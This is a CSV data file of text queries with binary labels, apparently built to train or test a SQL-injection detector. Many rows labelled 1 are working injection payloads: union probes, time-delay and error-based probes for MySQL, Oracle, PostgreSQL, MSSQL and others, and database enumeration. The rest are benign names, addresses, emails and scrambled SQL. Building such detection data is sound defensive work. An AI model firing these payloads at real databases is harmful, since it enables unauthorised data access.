Query,Label
"The &quot; rectification &quot; order came Guangdong Administration Press Publication , Radio , Film Television",0
duenas,0
wager.vigo@madrid2012.wf,0
"-2855""   )    )     )   union all select 1496,1496,1496,1496#",1
tosca,0
e7piocha,0
"SELECT * FROM Customers   WHERE Country NOT IN  ( 'Germany', 'France', 'UK' ) ;",0
"SELECT here AS morning, every AS [against]  FROM aboard",0
"UPDATE paper SET became =  'grabbed', City =  'anybody' WHERE possible =  climate",0
brewton,0
6048554064822313,0
"1""  )   and elt  (  4249  =  4249,7259  )   and   (  ""upkx""  =  ""upkx",1
or a  =  a--,1
beverie,0
vega del codorno,0
1' where 7176  =  7176,1
"Yet , &apos;s consistent body evidence hormones milk foods , chemicals environment sexual messages media blame",0
"1""  )  )   )  or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 )  and   (  (   ( ""mmsh"" = ""mmsh",1
31640,0
SELECT am ( s )  FROM ago FULL OUTER JOIN,0
"SELECT * FROM amount WHERE now NOT IN  ( 'joy', 'action', 'anyone' )",0
SELECT * FROM sport WHERE cover = 'fair'  OR field = 'cow',0
"-3933'   )    )     )   union all select 6198,6198,6198,6198,6198#",1
"However , Director Fresacher seems little trust text",0
alperovi,0
43736952z,0
"1 where 5485  =  5485 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"1%'  )  )   and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (  '%' = '",1
1'+ ( select 'feof' where 1966 = 1966,1
SELECT   NOW (  )  + 1,0
SELECT * FROM  ( SELECT slide FROM breath ),0
"1"" rlike sleep ( 5 )  and ""rylv"" like ""rylv",1
U,0
requisitorio,0
puy,0
"1""   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""pebw"" like ""pebw",1
"c/ iglesia, s/n 11?f",0
enero,0
5558396757589314,0
-7562 )  or 8571 = 8571--,1
"1  )  )   )  or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
hamzeh,0
"-2602' union all select 5715,5715,5715,5715,5715,5715,5715,5715,5715--",1
SELECT try FROM load UNION ALL SELECT nervous FROM making ORDER BY solid,0
2291171054683392,0
hanzlice,0
trevetha,0
reclinar,0
"1 and ascii ( lower ( substring  (  (  select top 1 name from sysobjects where xtype = 'u' ) , 1, 1  )  )   )  > 116",1
champ,0
But nobody quite ready three-year-old Fenton Kirkland,0
"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
"Israeli warplanes attack target inside Syria , official says Israeli warplanes struck target inside Syrian port city Latakia Thursday night , senior administration official confirms Fox News",0
SELECT * FROM depth WHERE since BETWEEN 'supper' AND 'rope',0
puri@espaciodelpintor.er,0
caiza,0
"select * from users where id = '1' or !<1 union select 1,version (  )  -- 1'",1
"-8881%' union all select 8420,8420,8420,8420,8420,8420,8420#",1
SELECT column_name FROM table_name WHERE column_name BETWEEN value1 AND value2,0
"1""  )   as kuuf where 6908  =  6908",1
7370150636603952,0
SELECT TOP 50 PERCENT * FROM terrible SELECT * FROM film FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM view,0
One thing I look forward every Halloween trends,0
exec  (  @s  ),1
"1""   )    )    as hzcq where 9250  =  9250 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",1
tregenza,0
incisivo,0
"calle platerias, 47",0
16601924h,0
yoe,0
"Meanwhile , 35-year-old Sri Lankan asylum seeker died suspected heart attack arriving asylum boat Christmas Island week",0
arrebatarse,0
He attended visible escort angels,0
33971,0
"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",1
lilien@aprendeaestudiar.lt,0
16812,0
rabulas,0
cordelado,0
"1""  )   where 6964  =  6964",1
3786000000000000,0
40984940k,0
sigenza,0
"US President Barack Obama kept informed situation , said White House spokesperson Jay Carney",0
"SELECT Employees.smaller, COUNT ( Orders.noneID )  AS everybodyFROM    ( OrdersINNER JOIN house ON Orders.degreeID  =  Employees.warnID )",0
pressbur,0
"1%""   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""%""  =  """,1
SELECT but ( s ) FROM cake INNER JOIN,0
"1'||  (  select 'bpml' where 7360  =  7360 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'",1
0029687955884916,0
SELECT * FROM system WHERE freedom BETWEEN 'animal' AND 'sheet',0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4-- sapi",1
1' )  where 2227 = 2227,1
SELECT season FROM book UNION SELECT out FROM pattern ORDER BY naturally,0
1'  )   as yqld where 2489  =  2489,1
"-1485'   )    )     )   union all select 7661,7661,7661,7661,7661--",1
andruzzi,0
"1'  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  'wdru' like 'wdru",1
macinnes,0
"-1055' union all select 7758,7758,7758,7758,7758,7758--",1
caesar-vitez2@apelton.sy,0
"SELECT SUBDATE ( ""2017-06-15 09:34:21"", INTERVAL 15 MINUTE ) ;",0
SELECT AVG ( crack ) FROM lost SELECT SUM ( paper ),0
aldrich,0
"1'|| ( select 'txyy' where 6500 = 6500 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1  )  )  ||'",1
"1"" procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )",1
calle eduard toldra 137 5?a,0
"1""  )   where 6632  =  6632 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1
like,1
"1""  )  )   as rhea where 2982 = 2982 or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu ) --",1
clorosis,0
rebolledo de la torre,0
4073783110590723,0
"pl. francisca pacheco, 81",0
"1  )   where 5464  =  5464 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1',  (  select   (  case when   (  6560  =  2813  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )",1
5h5c8,0
65358703v,0
SELECT * FROM  ( SELECT weak FROM breakfast ),0
It devises conditions,0
"1"" and make_set ( 8403 = 8403,8899 )",1
"1, ( case when 8260 = 8260 then 1 else null end )",1
SELECT * FROM product WHERE water BETWEEN 'case' AND 'mail',0
"SELECT * FROM measure WHERE accurate IN  ( 'observe', 'suggest', 'current' )",0
SELECT COUNT ( in ) FROM lovely,0
"select * from users where id = 1 or "";1"" or 1 = 1 -- 1",1
-3246%' union all select 4012#,1
SELECT DISTINCT corner FROM shore,0
stratten,0
end and   (  9416  =  9416,1
"1""  )  )   and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (  ""mzhk"" = ""mzhk",1
"1' )  and elt ( 1210 = 1210,sleep ( 5  )  )",1
"An estimated one 2,000 children born year neither boy girl",0
"In past , good financial situation meant local authorities could away high municipal rates",0
"SELECT rocky,poetry,simple FROM negative LEFT JOIN Orders ON throat.frozenID =  reason.sleep ORDER BY inch.finger",0
jocs olimpics 110 1-b,0
SELECT AVG ( fresh ) FROM child,0
"1"" )  and 6565 = 2647 and  ( ""mrge"" like ""mrge",1
fresno de la vega,0
SELECT pride ( s ) FROM enjoy INNER JOIN,0
SELECT * FROM variety WHERE social = 'business'  OR fur = 'highest',0
"comandante barja 84,",0
"1""  )  )   rlike sleep ( 5 )  and   (  (  ""fzlr"" = ""fzlr",1
irado,0
select  ( case when  ( 6045 = 2786 )  then 6045 else 1/ ( select 0 )  end ) --,1
"1 )  as biup where 1414 = 1414 union all select null,null,null,null,null,null,null,null#",1
dikaitis5,0
declare @q nvarchar  ( 200 )  select @q  =  0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec ( @q ),1
gupton,0
"1' and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and 'cdgm' like 'cdgm",1
virgen,0
"c/ pedro hidalgo, 137, 9?g",0
niwinska@estudiodeyoga.td,0
47620,0
UPDATE good SET trouble = 'relationship'WHERE electricity = 'excellent',0
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and 'cwuy' = 'cwuy",1
7964540000000000,0
68255924c,0
SELECT river ( s )  FROM laugh SELECT combine FROM increase,0
15423399j,0
"1""  )   where 4964  =  4964",1
1 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1
46529,0
"1""  )  )   or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and   (  (  ""wdye"" like ""wdye",1
SELECT lay ( s )  FROM shine SELECT victory ( s ),0
barceo,0
?carburador,0
8444341614355746,0
SELECT * FROM ahead 3 SELECT * FROM center,0
handler,1
prullans,0
"1'   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'gmvk' like 'gmvk",1
"1"" where 9919 = 9919",1
marlsela,0
segart,0
atontamiento,0
rom87231o,0
2ea6on9s,0
rumsey@ubikuo.coop,0
peafiel,0
SELECT listen ( s )  FROM trace SELECT whatever FROM aside,0
FROM  ( SELECT DISTINCT slipped FROM sink ),0
SELECT * FROM cup WHERE care BETWEEN '1996-07-01' AND '1996-07-31',0
81037080f,0
", found Jan",0
SELECT * FROM star WHERE Price NOT BETWEEN 10 AND 20,0
7ngr5ta3ente,0
"On last weekend August , Vogtsbauernhof Black Forest Open Air Museum Gutach near Hornberg firmly hands children",0
"-2423'  )  )   )  union all select 8256,8256,8256,8256,8256,8256,8256,8256--",1
jaqueline,0
wara,0
But suggestion stronger demand came Friday two reports Chinese manufacturing showed uptick activity,0
"1"" )  and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )  and  ( ""diiv"" = ""diiv",1
"select * from users where id = 1 + $+*$ union select null,@@VERSION -- 1",1
13421536r,0
1  )   as fnpq where 5209  =  5209,1
SELECT * FROM disease WHERE establish LIKE '%alike%',0
9054650550547446,0
SELECT * FROM upward FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM ask,0
"-7543'   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
o1e6e2d6,0
"1"" )  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users )  and  ( ""jebr"" like ""jebr",1
SELECT over ( s )  FROM slipped SELECT couple FROM area,0
SELECT tribe ( s )  FROM necessary UNION,0
5277668025491077,0
(  select * from   (  select  (  sleep  (  5   )    )     )  acdk  )  #,1
3176065165742980,0
2797490000000000,0
08363269d,0
1'  )  )   as qaki where 5272 = 5272,1
"1""   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   ""qnqb"" like ""qnqb",1
braa,0
karyl,0
"Mr Usher &apos;s instant message group included bankers Barclays Citigroup , people close situation said",0
empuar,0
SELECT * FROM piano WHERE found BETWEEN speak09/01/1996private AND produce15/31/1996change,0
1'   )    )    as vuzt where 4971  =  4971,1
callejon san felices 187,0
"SELECT hospital AS double, saved AS [desk]  FROM musical",0
SELECT * FROM pot WHERE attention = 'building',0
SELECT * FROM should WHERE thread IN  ( SELECT forty FROM have ),0
select  ( case when  ( 4306 = 2815 )  then 4306 else 1/ ( select 0 )  end ) --,1
It mainly chants away fans could heard,0
3283,0
"select * from users where id = '1'<@.. union select 1,version (  )  -- 1'",1
thuthuy,0
saskia,0
trooger_gereighty@quierocortinas.mil,0
benji,0
35500,0
"1' )  or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and  ( 'lfhx' = 'lfhx",1
"&quot; It matter something might choose , &quot; said Hasan Ikhrata , executive director Southern California Assn",0
"1%"" )  or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",1
22134277c,0
SELECT * FROM street ORDER BY suddenly,0
SELECT AVG ( depend ) FROM women,0
"1' )  or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and  ( 'cogf' like 'cogf",1
decuir,0
"-2460%""  )   or   (  2660  =  5767  )  *5767 and   (  ""%""  =  """,1
"1""  )   where 7165  =  7165 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1
SELECT AVG ( conversation ) FROM plenty,0
"c/ otumba, 132,",0
"1%""   )    )    and   (  3020  =  3020  )  *6703 and    (    (   ""%""  =  """,1
-9434' )  union all select 3106#,1
1' )  or sleep ( 5 )  and  ( 'kgbm' = 'kgbm,1
"1'   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   'fgox' like 'fgox",1
"1""  )   where 3390  =  3390",1
UPDATE flame SET wish = 'mouth'WHERE lovely = 'cave',0
moriego,0
select   (  case when   (  7019  =  1998  )   then 7019 else 7019*  (  select 7019 from mysql.db  )   end  )  #,1
121,0
"1"" procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )  and ""ikhr"" = ""ikhr",1
"In , postal service miles mark comes public accessibility",0
"-9871"" )  union all select 9082#",1
10513,0
46688,0
1' and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and 'pnpx'  =  'pnpx,1
SELECT TOP 3 * FROM son SELECT * FROM race 3SELECT * FROM year,0
SELECT * FROM behavior WHERE oxygen = 'saw' FETCH FIRST 3 ROWS ONLY,0
-8069'   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   'qbvz'  =  'qbvz,1
caridad,0
SELECT * FROM grandfather WHERE party = 'family' LIMIT 3,0
"Israeli television broadcaster Channel 2 showed satellite images base Latakia , Russian S-125 Newa-type defence missiles battery SA-3 missiles could seen , according Channel 2 range 35 kilometres transport warheads weighing 70 kilograms",0
rahmani,0
SELECT COUNT ( DISTINCT plus )  FROM chest,0
"1"" )  and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and  ( ""hbgv"" = ""hbgv",1
/,1
suponer,0
"select * from generate_series  (  3990,3990,case when   (  3990  =  9597  )   then 1 else 0 end  )   limit 1--",1
1 )  and 8594 =  ( select 8594 from pg_sleep ( 5  )  )  --,1
"1"" and make_set  (  8403  =  8403,8899  )   and ""bbgg""  =  ""bbgg",1
45256,0
"UPDATE worry SET seven =  'man', City =  'easily' WHERE hope =  action",0
3313243213262173,0
"1""  )  )   as vdbf where 7969 = 7969 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )  --",1
serpe4tinamente,0
"&quot; There need radical surgery need take aspirin , &quot; said Randy Rentschler , commission &apos;s director legislation public affairs",0
The man reported taken safety area,0
cuad5in1m3o,0
"1'+ ( select 'zkuf' where 3591 = 3591 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null  )  )  +'",1
budd9,0
scotty,0
"1 and elt ( 1210 = 1210,sleep ( 5  )  )",1
63188831b,0
SELECT AVG ( won ) FROM foreign,0
"select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  (  ""%"" = """,1
"In , collided BMW 23-year-old Konstanz resident , travelling lane",0
-4184'   )    )     )   or 2579  =  4654#,1
43427,0
1875,0
The FAA ruling applies American airlines,0
"1  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )",1
tosigoso,0
"1""  )   as nfpe where 2679  =  2679",1
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1
san vicente del palacio,0
SELECT * FROM blanket  WHERE merely NOT LIKE '[noon]%',0
6653,0
SELECT soldier ( s )  FROM pitch FULL OUTER JOIN,0
"-5294%"" )  or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and  ( ""%"" = """,1
